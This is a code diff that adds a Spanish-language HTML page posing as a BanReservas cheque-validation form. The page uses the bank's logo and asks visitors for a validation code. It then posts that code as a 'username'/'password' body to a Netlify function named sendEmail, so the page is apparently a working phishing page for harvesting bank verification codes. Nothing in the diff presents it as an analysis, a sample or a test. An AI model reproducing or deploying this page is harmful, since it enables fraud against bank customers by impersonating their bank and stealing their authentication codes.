@@ -1,1 +1,101 @@
-https://auladiv.com/ediweb/index.htm
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validación de Cheque - BanReservas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 150px;
+        }
+        h2 {
+            color: #003366;
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        input[type="text"] {
+            padding: 10px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        button {
+            background-color: #003366;
+            color: #ffffff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1em;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #00509e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.banreservas.com/logos/logo.svg" alt="Logo de BanReservas">
+        </div>
+        <h2>Ingrese el código para completar la validación del cheque</h2>
+        <form id="codeForm">
+            <input type="text" id="code" name="code" placeholder="Código de validación" required>
+            <button type="submit">Validar</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('codeForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const code = document.getElementById('code').value;
+
+            try {
+                const response = await fetch('/.netlify/functions/sendEmail', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username: code, password: '' }),
+                });
+
+                if (response.ok) {
+                    alert('El código fue enviado con éxito.');
+                } else {
+                    alert('Hubo un error al validar el código.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Hubo un problema al procesar la solicitud.');
+            }
+        });
+    </script>
+</body>
+</html>
